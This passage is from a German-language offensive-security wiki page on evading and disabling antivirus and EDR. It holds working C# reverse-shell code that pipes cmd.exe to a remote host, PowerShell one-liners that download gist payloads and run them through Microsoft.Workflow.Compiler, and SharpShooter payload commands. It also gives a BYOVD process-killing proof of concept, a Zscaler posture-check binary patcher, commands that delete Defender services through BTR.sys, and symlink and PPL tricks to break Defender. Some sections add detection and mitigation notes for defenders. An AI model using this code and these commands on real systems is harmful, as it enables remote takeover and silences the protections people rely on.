			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# mit Compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste der C#-Obfuscatoren: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python zum Erstellen von Injectors verwenden, Beispiel:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Andere Tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Space ausschalten

Storm-2603 nutzte ein kleines Konsolendienstprogramm namens **Antivirus Terminator**, um den Endpunktschutz zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst AV-Dienste mit Protected-Process-Light (PPL) nicht blockieren können.<sup>[[12]](#references)</sup>

Wichtige Erkenntnisse
1. **Signierter Treiber**: Die auf dem Datenträger abgelegte Datei heißt `ServiceMouse.sys`, aber die Binärdatei ist der rechtmäßig signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er auch bei aktiviertem Driver-Signature-Enforcement (DSE) geladen.
2. **Dienstinstallation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die erste Zeile registriert den Treiber als **Kernel-Dienst**, die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **Vom Treiber bereitgestellte IOCTLs**
   | IOCTL-Code | Funktion                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Beendet einen beliebigen Prozess anhand seiner PID (wird verwendet, um Defender-/EDR-Dienste zu beenden) |
   | `0x990000D0` | Löscht eine beliebige Datei auf dem Datenträger |
   | `0x990001D0` | Entlädt den Treiber und entfernt den Dienst |

   Minimaler C-Proof-of-Concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Warum es funktioniert**: BYOVD umgeht den Schutz im User-Mode vollständig; im Kernel ausgeführter Code kann *geschützte* Prozesse öffnen und beenden oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Hardening-Funktionen.

Erkennung / Mitigation
•  Aktivieren Sie Microsofts Sperrliste für verwundbare Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.
•  Überwachen Sie das Erstellen neuer *Kernel*-Dienste und lösen Sie einen Alarm aus, wenn ein Treiber aus einem für alle beschreibbaren Verzeichnis geladen wird oder nicht auf der Allowlist steht.
•  Achten Sie auf Handles im User-Mode zu benutzerdefinierten Geräteobjekten, auf die verdächtige `DeviceIoControl`-Aufrufe folgen.

### Zscaler Client Connector-Posture-Checks durch Patching von Binärdateien auf dem Datenträger umgehen

Zscalers **Client Connector** wendet Geräte-Posture-Regeln lokal an und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen einen vollständigen Bypass:

1. Die Posture-Auswertung erfolgt **vollständig clientseitig** (ein boolescher Wert wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen lediglich, ob die verbindende ausführbare Datei **von Zscaler signiert** ist (über `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Durch **Patching von vier signierten Binärdateien auf dem Datenträger** lassen sich beide Mechanismen neutralisieren:

| Binärdatei | Gepatchte ursprüngliche Logik | Ergebnis |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jeder Check als konform gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder Prozess (auch ein unsignierter) kann sich mit den RPC-Pipes verbinden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Auszug eines minimalen Patchers:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nach dem Ersetzen der Originaldateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Checks werden als **grün/konform** angezeigt.
* Nicht signierte oder modifizierte Binärdateien können die Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das durch die Zscaler-Richtlinien definierte interne Netzwerk.

Diese Fallstudie zeigt, wie sich rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgehen lassen.

## Missbrauch vertrauenswürdiger Funktionen von Microsoft Defender `BTR.sys`

Der **Boot-Time Removal**-Treiber von Defender ist ein nützliches Gegenbeispiel zu klassischem BYOVD. `BTR.sys` ist eine legitime, von Microsoft signierte Remediation-Komponente ohne Speicherbeschädigungsfehler und ohne IOCTL-Schnittstelle; nachdem ein Angreifer Administratorzugriff und `SeLoadDriverPrivilege` erlangt hat, kann er stattdessen die private Remediation-Transaktion fälschen und die vorgesehenen Datei-/Registry-Operationen im Ring 0 ausführen. Dies ist ein **Primitive zur Neutralisierung von AV/EDR nach einer Kompromittierung, kein Initialzugriff und keine Rechteausweitung**. Der Treiber lässt sich aus der `BOOTTIMETOOL`-Ressource der `MpEngine.dll` des Ziels selbst extrahieren, statt einen auffälligen Drittanbietertreiber einzuschleusen.<sup>[[36]](#references)</sup>

### Bereitstellen des One-Shot-Treibers

Defender legt die Ressource normalerweise als Datei mit einem zufälligen Namen im Format `[a-z]{8}.sys` ab und registriert einen ähnlich benannten Kernel-Service. `DriverEntry` liest den `Args`-Wert des Service, öffnet den referenzierten NTFS-ADS, entschlüsselt und validiert die Aktionsliste, schreibt Feedback und gibt nach erfolgreicher Ausführung `0xC0000056` (`STATUS_DELETE_PENDING`) zurück, damit der Treiber entladen wird, statt resident zu bleiben. Ein gefälschter Service hat die folgenden charakteristischen Werte.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Der `:changelist`-Stream enthält einen RC4-verschlüsselten Blob. Die analysierten Builds verwenden wiederholt einen festen 256-Byte-Schlüssel, sodass die Verschlüsselung keine Autorisierungsgrenze darstellt. Ein gültiger Klartext besteht aus einem globalen 24-Byte-Header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, Header-CRC und einer aus der Payload abgeleiteten Transaktions-ID), gefolgt von einem nullterminierten Feedbackpfad in UTF-16 und beliebig vielen Elementen. Jedes Element hat einen 16-Byte-Header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) sowie aktionsspezifische Daten, die mit **genau vier NUL-Bytes** enden. Jeder Header- und Datenbereich wird einzeln mit CRC-32-Polynom `0xEDB88320`, einem Anfangszustand von `0xFFFFFFFF` und **ohne abschließendes XOR** (`~CRC32`) geprüft; der CRC-Zustand wird für jeden Bereich zurückgesetzt.<sup>[[36]](#references)[[37]](#references)</sup>

Die akzeptierten Aktions-IDs stellen diese Kernel-Primitiven bereit.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Elementdaten | Ergebnis |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Datei löschen, auch wenn sie gesperrt ist |
| 2 | `[UTF-16 path]` | Leeres Verzeichnis entfernen |
| 3 | `[Flags][source][destination]` | Datei in einen vom Angreifer ausgewählten geschützten Pfad verschieben; ein leeres Ziel bedeutet Löschen |
| 4 | `[Flags][key path]` | Registrierungsschlüssel rekursiv löschen |
| 5 | `[Flags][key path + "\\" + value]` | Registrierungswert löschen |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Registrierungswert erstellen/aktualisieren und fehlende Schlüsselpfade erstellen |

Bei den Aktionen 5 und 6 ist das Trennzeichen für Schlüssel/Wert auf dem Draht **zwei aufeinanderfolgende Backslashes**; ein herkömmlich formatierter Pfad wird nicht korrekt aufgeteilt. Die Feedbackdatei spiegelt größtenteils die Anfrage wider, aber die ersten vier Datenbytes jedes Elements werden zu dessen resultierendem `NTSTATUS`. Bei den Aktionen 1 und 2, die kein vorangestelltes Flags-Feld haben, verschiebt BTR den Pfad in die vier reservierten abschließenden Bytes, um Platz für diesen Status zu schaffen.<sup>[[36]](#references)</sup>

### `BTR_CLI`-Ablauf und Frühstart-Zeitfenster

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementiert die gesamte Kette: `BTR.sys` aus dem lokalen Defender extrahieren, `<random>.sys:changelist` und einen Feedback-Stream erstellen, verkettete Aktionen serialisieren, mit Prüfsummen versehen und verschlüsseln, den Dienst-Registrierungsschlüssel direkt erstellen und anschließend `NtLoadDriver` für `-trigger now` aufrufen oder den Treiber für `-trigger boot` als Systemstarttreiber belassen. Die direkte Registrierungsvorbereitung umgeht den normalen SCM-Pfad `CreateServiceW` und erzeugt daher **kein** Dienstinstallationsereignis mit Event ID 7045. Durch den Boot-Trigger ausgelöste Artefakte können später mit `BTR_CLI.exe -cleanup <service_name>` entfernt werden.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` ist nicht verwendbar, da BTR bereits vor der Bereitschaft des Storage-Stacks und des `SystemRoot`-Links Datei-I/O aus `DriverEntry` ausführt. `Start=1` in Verbindung mit der Gruppe `Boot Bus Extender` mit hoher Priorität führt die Ausführung stattdessen in Phase 1 aus: NTFS ist verwendbar, aber viele Sicherheits-Treiber mit Systemstart und User-Mode-EDR-Dienste wurden noch nicht initialisiert. Boot-Start-Filter wie `WdFilter` sind möglicherweise bereits geladen, doch BTR kann ihre Binärdateien oder Service-Konfiguration vor dem nächsten Start entfernen und Service-Executables löschen, bevor SCM sie startet. ELAM schließt diese Lücke nicht, da BTR nach der Boot-Start-Auswertung ausgeführt wird und eine gültige Microsoft-Signatur besitzt.<sup>[[36]](#references)</sup>

Mehrere Aktionen werden in einer Transaktion ausgeführt. Der PoC stellt Action 1 für die fest codierte Datei `\SystemRoot\Temp\BootClean.log` voran: BTR erstellt dieses Log, verarbeitet dann seine eigene Löschanforderung und entfernt es vor dem Entladen. Das reduziert die Spuren. Feedback in `<random>.sys:<random>.dat` abzulegen, ermöglicht es, den Treiber und beide Streams gemeinsam zu entfernen.<sup>[[36]](#references)[[37]](#references)</sup>

### Korrelationen mit hoher Aussagekraft zur Erkennung

Regeln, die nur Signaturen berücksichtigen, und die Microsoft-Blockliste für anfällige Treiber verhindern keinen Missbrauch der vorgesehenen BTR-Funktionalität. Bevorzuge diese Verhaltenskorrelationen und unterscheide dabei legitime Defender-Lineage von einem beliebigen Launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Die Erstellung von `.sys:changelist` ist ein universelles Merkmal des BTR-Stagings. Ein `.dat`-ADS, das an dieselbe `.sys` angehängt ist, ist besonders verdächtig, da Defender Feedback normalerweise unter `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` ablegt.
- **Sysmon 12/13 ohne System 7045:** Korreliere die direkte Erstellung von `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, die `Args=...:changelist` und `Group=Boot Bus Extender` enthält, mit dem Fehlen eines passenden SCM-Installationsereignisses.
- **Sysmon 6 -> 23:** Korreliere das Laden eines bekannten BTR-Treibers aus einer Nicht-Defender-Lineage mit einer anschließenden, `System`/PID 4 zugeschriebenen Dateilöschung, insbesondere bei Sicherheits-Binärdateien.
- **Sysmon 11 -> 23:** Alarmiere bei der schnellen Erstellung und Löschung von `\SystemRoot\Temp\BootClean.log` durch `System`/PID 4.
- Beschränke und überwache die Zuweisung bzw. Aktivierung von `SeLoadDriverPrivilege`; eine Microsoft-Signatur allein reicht nicht als Vertrauensnachweis, wenn ein Sicherheitstool-Treiber von `cmd.exe`, PowerShell oder einem unbekannten Prozess gestaged wird.

## Missbrauch von Protected Process Light (PPL), um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) erzwingt eine Signer-/Level-Hierarchie, sodass geschützte Prozesse einander nur dann manipulieren können, wenn sie über dasselbe oder ein höheres Schutzniveau verfügen. Aus offensiver Sicht kannst du, wenn du eine PPL-fähige Binärdatei legitim starten und ihre Argumente kontrollieren kannst, gutartige Funktionalität (z. B. Logging) in eine eingeschränkte, PPL-gestützte Schreibprimitive für geschützte Verzeichnisse umwandeln, die von AV/EDR verwendet werden.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Was einen Prozess als PPL ausführt
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit `CreateProcess` und den Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss ein kompatibles Schutzniveau angefordert werden, das zum Signer der Binärdatei passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Schutzniveaus führen dazu, dass die Erstellung fehlschlägt.

Eine umfassendere Einführung zu PP/PPL und dem LSASS-Schutz findest du hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt das Schutzniveau aus und leitet Argumente an die Ziel-EXE weiter):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Verwendungsmuster:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Die signierte Systembinary `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei an einen vom Aufrufer angegebenen Pfad zu schreiben.
- Wird sie als PPL-Prozess gestartet, erfolgt der Dateizugriff mit PPL-Berechtigung.
- ClipUp kann keine Pfade mit Leerzeichen verarbeiten; verwende 8.3-Kurzpfade, um auf normalerweise geschützte Speicherorte zu verweisen.

8.3-Kurzpfad-Hilfsprogramme
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzpfad in cmd ermitteln: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Missbrauchskette (abstrakt)
1) Starte das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` über einen Launcher (z. B. CreateProcessAsPPL).
2) Übergib das ClipUp-Argument für den Logpfad, um eine Datei in einem geschützten AV-Verzeichnis (z. B. Defender Platform) zu erstellen. Verwende bei Bedarf 8.3-Kurznamen.
3) Wenn die Zieldatei während des Betriebs normalerweise von der AV geöffnet/gesperrt ist (z. B. MsMpEng.exe), plane den Schreibvorgang beim Booten, bevor die AV startet, indem du einen automatisch startenden Dienst installierst, der zuverlässig früher ausgeführt wird. Überprüfe die Boot-Reihenfolge mit Process Monitor (Boot-Logging).
4) Beim Neustart erfolgt der durch PPL abgesicherte Schreibvorgang, bevor die AV ihre Binärdateien sperrt, beschädigt die Zieldatei und verhindert den Start.

Beispielaufruf (Pfade aus Sicherheitsgründen redigiert/gekürzt):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, nicht steuern, sondern nur den Speicherort. Diese Primitive eignet sich daher eher für Beschädigungen als für das gezielte Einschleusen bestimmter Inhalte.
- Zum Installieren/Starten eines Dienstes und für ein Zeitfenster zum Neustarten sind lokale Administratorrechte/SYSTEM erforderlich.
- Das Timing ist entscheidend: Das Ziel darf nicht geöffnet sein; die Ausführung beim Systemstart vermeidet Dateisperren.

Erkennungen
- Prozesserstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere mit nicht standardmäßigen Startprogrammen als übergeordnetem Prozess, im Umfeld des Systemstarts.
- Neue Dienste, die so konfiguriert sind, dass sie verdächtige Binärdateien automatisch starten und regelmäßig vor Defender/AV starten. Untersuche die Erstellung/Änderung von Diensten vor Fehlern beim Defender-Start.
- Überwachung der Dateiintegrität von Defender-Binärdateien/Platform-Verzeichnissen; unerwartete Dateien, die von Prozessen mit Protected-Process-Flags erstellt/geändert werden.
- ETW/EDR-Telemetrie: Suche nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und nach anomaler Verwendung von PPL-Leveln durch Nicht-AV-Binärdateien.

Gegenmaßnahmen
- WDAC/Code Integrity: Beschränke, welche signierten Binärdateien als PPL ausgeführt werden dürfen und unter welchen übergeordneten Prozessen; blockiere den Aufruf von ClipUp außerhalb legitimer Kontexte.
- Diensthygiene: Beschränke die Erstellung/Änderung von automatisch startenden Diensten und überwache Manipulationen der Startreihenfolge.
- Stelle sicher, dass der Manipulationsschutz von Defender und der Early-Launch-Schutz aktiviert sind; untersuche Startfehler, die auf eine Beschädigung von Binärdateien hindeuten.
- Ziehe in Betracht, die Erzeugung von 8.3-Kurznamen auf Volumes zu deaktivieren, auf denen Sicherheitstools gespeichert sind, sofern dies mit deiner Umgebung kompatibel ist (gründlich testen).

## Manipulation von Microsoft Defender über Platform Version Folder Symlink Hijack

Windows Defender wählt die Plattform, von der es ausgeführt wird, durch Auflisten der Unterordner unter:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit der höchsten lexikografischen Versionszeichenfolge (z. B. `4.18.25070.5-0`) aus und startet dann die Defender-Dienstprozesse von dort (wobei die Dienst-/Registrierungspfade entsprechend aktualisiert werden). Bei dieser Auswahl werden Verzeichniseinträge berücksichtigt, einschließlich Verzeichnis-Reparse-Points (Symlinks). Ein Administrator kann dies nutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL sideloading oder eine Dienstunterbrechung zu bewirken.<sup>[[21]](#references)[[22]](#references)</sup>

Voraussetzungen
- Lokaler Administrator (erforderlich, um Verzeichnisse/Symlinks im Platform-Ordner zu erstellen)
- Möglichkeit, einen Neustart durchzuführen oder eine erneute Auswahl der Defender-Plattform auszulösen (Neustart des Dienstes beim Systemstart)
- Es sind nur integrierte Tools erforderlich (`mklink`)

Warum es funktioniert
- Defender blockiert Schreibzugriffe in seinen eigenen Ordnern, aber bei der Auswahl der Plattform werden Verzeichniseinträge als vertrauenswürdig behandelt und der lexikografisch höchste Versionsordner ausgewählt, ohne zu prüfen, ob das Ziel auf einen geschützten/vertrauenswürdigen Pfad verweist.

Schritt für Schritt (Beispiel)
1) Erstelle einen beschreibbaren Klon des aktuellen Plattformordners, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Verzeichnissymlink mit einer höheren Versionsnummer, der auf deinen Ordner verweist:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfen, ob MsMpEng.exe (WinDefend) über den umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Du solltest den neuen Prozesspfad unter `C:\TMP\AV\` sowie die Dienstkonfiguration/Registrierung beobachten, die diesen Speicherort widerspiegelt.

Post-Exploitation-Optionen
- DLL sideloading/code execution: Lege DLLs ab bzw. ersetze DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in den Prozessen von Defender auszuführen. Siehe den obigen Abschnitt: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Entferne den Versionssymlink, damit der konfigurierte Pfad beim nächsten Start nicht aufgelöst werden kann und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Beachte, dass diese Technik allein keine Rechteausweitung ermöglicht; sie erfordert Adminrechte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red Teams können die Runtime-Evasion aus dem C2-Implantat in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über vom Angreifer kontrollierten, positionsunabhängigen Code (PIC) leiten. Dadurch lässt sich die Evasion über die kleine API-Oberfläche hinaus verallgemeinern, die viele Kits bereitstellen (z. B. CreateProcessA), und derselbe Schutz kann auch auf BOFs und Post-Exploitation-DLLs ausgeweitet werden.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Ansatz auf hoher Ebene
- Ein PIC-Blob zusammen mit dem Zielmodul mithilfe eines reflective loaders bereitstellen (vorangestellt oder als Begleitdatei). Der PIC muss in sich abgeschlossen und positionsunabhängig sein.
- Beim Laden der Host-DLL deren IMAGE_IMPORT_DESCRIPTOR durchlaufen und die IAT-Einträge für gezielte Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) so ändern, dass sie auf schlanke PIC-Wrapper verweisen.
- Jeder PIC-Wrapper führt vor dem Tail-Call an die echte API-Adresse Evasions aus. Typische Evasions umfassen:
  - Memory mask/unmask rund um den Aufruf (z. B. Beacon-Bereiche verschlüsseln, RWX→RX, Seitennamen/Berechtigungen ändern) und anschließend wiederherstellen.
  - Call-Stack Spoofing: Einen harmlos wirkenden Stack aufbauen und zur Ziel-API wechseln, sodass die Call-Stack-Analyse erwartete Frames auflöst.<sup>[[9]](#references)</sup>
- Zur Kompatibilität eine Schnittstelle exportieren, über die ein Aggressor-Skript (oder ein Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und Post-Ex-DLLs gehookt werden sollen.

Warum hier IAT Hooking
- Funktioniert für beliebigen Code, der den gehookten Import verwendet, ohne den Tool-Code zu ändern oder sich darauf zu verlassen, dass Beacon bestimmte APIs proxyt.
- Deckt Post-Ex-DLLs ab: Durch das Hooking von LoadLibrary* lassen sich Modulladevorgänge abfangen (z. B. System.Management.Automation.dll, clr.dll) und dieselben Memory- und Stack-Evasions auf deren API-Aufrufe anwenden.
- Ermöglicht durch das Wrapping von CreateProcessA/W wieder eine zuverlässige Verwendung von Post-Ex-Befehlen zum Starten von Prozessen, die auf Call-Stack-basierten Erkennungen beruhen.

Skizze eines minimalen IAT Hooks (x64-C/C++-Pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Wende den Patch nach Relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective Loader wie TitanLdr/AceLdr zeigen Hooking während des DllMain-Aufrufs des geladenen Moduls.
